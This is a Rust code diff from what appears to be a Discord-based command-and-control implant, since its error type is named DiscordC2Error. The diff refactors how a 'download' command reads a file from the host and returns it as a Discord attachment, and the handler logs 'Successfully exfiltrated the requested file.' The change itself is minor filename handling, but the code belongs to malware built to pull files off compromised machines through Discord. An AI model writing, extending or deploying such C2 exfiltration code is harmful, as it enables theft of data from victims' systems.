@@ -26,7 +26,7 @@ use serenity::{
 
 use tokio::{fs::File, io::AsyncReadExt};
 
-use tracing::{error, info as informational, warn};
+use tracing::{error, info as informational};
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
     command
@@ -98,17 +98,10 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
 
     let mut final_bytes = Vec::new();
 
-    let file_extension = file_path
-        .extension()
-        .and_then(|ext| ext.to_str())
-        .unwrap_or_else(|| {
-            warn!("Extension was not found");
-            "null"
-        });
 
     let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput(
         "File name not found.".to_string(),
-    ));
+    ))?.to_str().ok_or(DiscordC2Error::InvalidInput("file name couldn't be converted".to_string()))?;
 
     //TODO: reading 8kb into the file even if not necessary, this is why size checks are important
     loop {
@@ -121,14 +114,9 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
 
     Ok(AttachmentType::Bytes {
         data: Cow::from(final_bytes),
-        filename: format!(
-            "{}.{}",
-            file_name?.to_str().ok_or(DiscordC2Error::InvalidInput(
-                "file name couldn't be converted".to_string()
-            ))?,
-            file_extension
-        ),
+        filename: file_name.to_string(),
     })
+
 }
 
 pub async fn download_handler(
@@ -136,7 +124,7 @@ pub async fn download_handler(
     command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
     let attachment = run(&command.data.options).await;
-    
+
     match attachment {
         Ok(Some(attachment)) => {
             informational!("Successfully exfiltrated the requested file.");
